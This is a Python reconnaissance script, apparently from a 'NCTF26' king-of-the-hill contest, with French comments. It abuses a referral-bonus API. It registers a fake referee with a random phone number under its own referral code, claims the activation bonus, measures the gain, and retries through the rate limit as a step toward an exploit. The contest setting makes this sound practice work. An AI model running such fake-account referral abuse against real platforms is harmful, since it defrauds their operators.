#!/usr/bin/env python3
"""
NCTF26 KOTH — Reseau Fortune : recon du circuit de PARRAINAGE (générateur de net_gain).

On fait UN cycle : register(filleul, parrain=moi) -> bonus/activation(filleul) -> me.
Objectif : mesurer le gain par cycle (prime/commission) pour construire ensuite
l'exploit minimal. Retry lent à travers le rate-limit. Compte à nous seulement.
"""
import json, time, urllib.request, urllib.error, random
from http.cookiejar import CookieJar

HOST  = "http://13.37.197.230:28493"
TOKEN = "6eefff4072981996"
DELAY, MAX = 8, 10

cj = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def call(path, body=None, label=""):
    data = json.dumps(body).encode() if body is not None else None
    for attempt in range(1, MAX + 1):
        req = urllib.request.Request(HOST + path, data=data,
                                     headers={"Content-Type": "application/json"},
                                     method="POST" if body is not None else "GET")
        try:
            with opener.open(req, timeout=8) as r:
                txt = r.read().decode(errors="replace")
                print(f"  {label or path} -> {r.status} {txt[:300]}")
                try: return json.loads(txt)
                except Exception: return {}
        except urllib.error.HTTPError as e:
            b = e.read().decode(errors="replace")
            if e.code == 429:
                print(f"  {label or path} -> 429, retente {DELAY}s [{attempt}/{MAX}]"); time.sleep(DELAY); continue
            print(f"  {label or path} -> {e.code} {b[:300]}"); return {}
        except Exception as ex:
            print(f"  {label or path} -> erreur {ex}, retente {DELAY}s"); time.sleep(DELAY); continue
    print(f"  {label or path} -> abandon ({MAX} essais)"); return {}

print("1) join"); j = call("/api/join", {"token": TOKEN}, "join")
my_code = j.get("referral_code") or j.get("code")
print("   mon code :", my_code)
print("2) baseline"); call("/api/me", label="me(baseline)")

phone = "228" + "".join(random.choice("0123456789") for _ in range(8))
print(f"3) register filleul (phone={phone}, parrain={my_code})")
reg = call("/api/register", {"phone": phone, "parrain_code": my_code}, "register")
filleul = reg.get("code")

if filleul:
    print(f"4) prime d'activation du filleul {filleul}")
    call("/api/bonus/activation", {"filleul_code": filleul}, "bonus")
    print("5) état après un cycle")
    me = call("/api/me", label="me(après)")
    print()
    print(f"-> net_gain après 1 cycle = {me.get('net_gain')}, commissions = {me.get('commissions')}")
    print("   Colle la sortie : on calcule le gain/cycle et on bâtit l'exploit minimal.")
else:
    print("register n'a pas renvoyé de code filleul — colle la sortie, on ajuste.")
